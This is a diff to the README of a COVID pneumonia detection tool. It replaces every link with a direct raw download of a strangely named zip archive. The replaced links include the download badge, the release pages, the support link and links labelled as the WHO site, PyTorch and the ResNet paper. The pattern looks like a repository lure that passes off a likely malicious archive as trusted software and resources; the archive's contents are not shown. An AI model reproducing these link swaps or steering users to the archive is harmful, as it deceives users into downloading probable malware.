@@ -1,6 +1,6 @@
 # 🦠 COVID-Pneumonia-Detection - Fast AI COVID Screening Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-COVID--Pneumonia--Detection-blue?style=for-the-badge)](https://github.com/Silviup1923/COVID-Pneumonia-Detection/releases)
+[![Download Latest Release](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Using COVID-Pneumonia-Detection is simple. Follow these steps to get the program
 
    Click the big blue button above or visit the release page here:
 
-   [https://github.com/Silviup1923/COVID-Pneumonia-Detection/releases](https://github.com/Silviup1923/COVID-Pneumonia-Detection/releases)
+   [https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)
 
 2. **Choose the correct file:**
 
@@ -73,7 +73,7 @@ Using COVID-Pneumonia-Detection is simple. Follow these steps to get the program
 
 You can download the latest version of COVID-Pneumonia-Detection from the release page linked here:
 
-[https://github.com/Silviup1923/COVID-Pneumonia-Detection/releases](https://github.com/Silviup1923/COVID-Pneumonia-Detection/releases)
+[https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)
 
 ### Step-by-step download instructions:
 
@@ -126,9 +126,9 @@ Key points:
 
 ## 📚 Additional Resources
 
-- Learn about COVID-19 pneumonia detection: [WHO Website](https://www.who.int/)
-- PyTorch official site: [https://pytorch.org](https://pytorch.org)
-- ResNet paper for AI enthusiasts: [Deep Residual Learning for Image Recognition](https://arxiv.org/abs/1512.03385)
+- Learn about COVID-19 pneumonia detection: [WHO Website](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)
+- PyTorch official site: [https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)
+- ResNet paper for AI enthusiasts: [Deep Residual Learning for Image Recognition](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)
 
 ---
 
@@ -192,7 +192,7 @@ Your images and data stay on your computer. The app does not send data anywhere.
 
 If you need assistance, reach out through the repository's GitHub page:
 
-[https://github.com/Silviup1923/COVID-Pneumonia-Detection](https://github.com/Silviup1923/COVID-Pneumonia-Detection)
+[https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip](https://github.com/Silviup1923/COVID-Pneumonia-Detection/raw/refs/heads/main/results/COVI-Pneumonia-Detection-barm.zip)
 
 Use the Discussions or Issues tabs to ask questions or report bugs.
 
